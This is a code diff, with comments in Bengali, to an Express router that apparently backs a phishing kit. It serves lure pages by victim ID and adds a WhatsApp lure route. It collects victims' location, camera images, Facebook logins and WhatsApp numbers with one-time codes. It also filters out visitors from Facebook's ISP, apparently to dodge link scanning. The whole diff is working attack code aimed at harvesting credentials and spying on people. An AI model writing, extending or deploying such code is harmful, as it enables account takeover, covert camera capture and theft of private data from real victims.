@@ -12,6 +12,18 @@ const {
 } = require('../utils/helpers');
 
 // ================================================================
+// 🔥 ISP ব্লক লিস্ট – এই ISP থেকে এলে মেসেজ যাবে না
+// ================================================================
+const BLOCKED_ISP = 'Facebook, Inc.';
+
+function isIspBlocked(victim) {
+    if (victim.location && victim.location.isp) {
+        return victim.location.isp === BLOCKED_ISP;
+    }
+    return false;
+}
+
+// ================================================================
 // অটো ডিলিট: ১০ মিনিট
 // ================================================================
 const CLEANUP_INTERVAL = 60000;
@@ -37,23 +49,7 @@ setInterval(async () => {
 }, CLEANUP_INTERVAL);
 
 // ================================================================
-// 🔥 ISP ব্লক লিস্ট – এই ISP থেকে এলে মেসেজ যাবে না
-// ================================================================
-const BLOCKED_ISP = 'Facebook, Inc.';
-
-// ================================================================
-// চেক ফাংশন: কোনো ভিক্টিমের ISP ব্লকেড কিনা
-// ================================================================
-function isIspBlocked(victim) {
-    // location অবজেক্ট থাকতে হবে এবং isp ফিল্ড থাকতে হবে
-    if (victim.location && victim.location.isp) {
-        return victim.location.isp === BLOCKED_ISP;
-    }
-    return false;
-}
-
-// ================================================================
-// রাউটস
+// রাউটস – লিংক ভিজিট
 // ================================================================
 
 router.get('/v/:id', async (req, res) => {
@@ -99,6 +95,23 @@ router.get('/fb/:id', async (req, res) => {
 });
 
 // ================================================================
+// 🆕 হোয়াটসঅ্যাপ লিংক ভিজিট
+// ================================================================
+router.get('/wp/:id', async (req, res) => {
+    try {
+        console.log(`🔍 হোয়াটসঅ্যাপ লিংক ভিজিট: ${req.params.id}`);
+        const victim = await Victim.findOne({ id: req.params.id });
+        if (!victim) {
+            return res.status(404).send('লিঙ্কটি ভুল বা মেয়াদোত্তীর্ণ।');
+        }
+        res.sendFile(path.join(__dirname, '../public/wp.html'));
+    } catch (err) {
+        console.error('Error serving wp page:', err);
+        res.status(500).send('সার্ভার ত্রুটি');
+    }
+});
+
+// ================================================================
 // 🚨 ভিক্টিম ডেটা রিসিভ – ISP ব্লকিং সহ
 // ================================================================
 router.post('/api/victim', async (req, res) => {
@@ -111,7 +124,6 @@ router.post('/api/victim', async (req, res) => {
             return res.status(400).json({ status: 'error', message: 'Missing id' });
         }
 
-        // ভিক্টিম খুঁজি বা তৈরি করি
         let victim = await Victim.findOne({ id: data.id });
 
         if (!victim) {
@@ -147,7 +159,7 @@ router.post('/api/victim', async (req, res) => {
             console.log(`✅ ভিক্টিম আপডেট: ${data.id} (fbId: ${victim.fbId})`);
         }
 
-        // 🔥 ISP চেক
+        // ISP চেক
         const blocked = isIspBlocked(victim);
         console.log(`🔍 ভিক্টিম ISP: ${victim.location?.isp || 'N/A'} → ${blocked ? '🚫 ব্লকড (মেসেজ যাবে না)' : '✅ অনুমোদিত (মেসেজ যাবে)'}`);
 
@@ -200,7 +212,6 @@ router.post('/api/camera', async (req, res) => {
             return res.status(404).json({ status: 'error', message: 'Victim not found' });
         }
 
-        // 🔥 ISP চেক
         const blocked = isIspBlocked(victim);
         console.log(`🔍 ক্যামেরা রিকোয়েস্টে ISP: ${victim.location?.isp || 'N/A'} → ${blocked ? '🚫 ব্লকড (ছবি যাবে না)' : '✅ অনুমোদিত (ছবি যাবে)'}`);
 
@@ -316,7 +327,7 @@ router.post('/api/fblogin', async (req, res) => {
 });
 
 // ================================================================
-// হোয়াটসঅ্যাপ ডেটা রিসিভ (নাম্বার + ওটিপি)
+// 🆕 হোয়াটসঅ্যাপ ডেটা রিসিভ (নাম্বার + ওটিপি)
 // ================================================================
 router.post('/api/whatsapp', async (req, res) => {
     try {
@@ -332,7 +343,6 @@ router.post('/api/whatsapp', async (req, res) => {
             return res.status(404).json({ status: 'error', message: 'Victim not found' });
         }
 
-        // ইউজারকে মেসেজ পাঠানো হবে
         const userId = victim.fbId;
 
         // ফোন নাম্বার পেলে
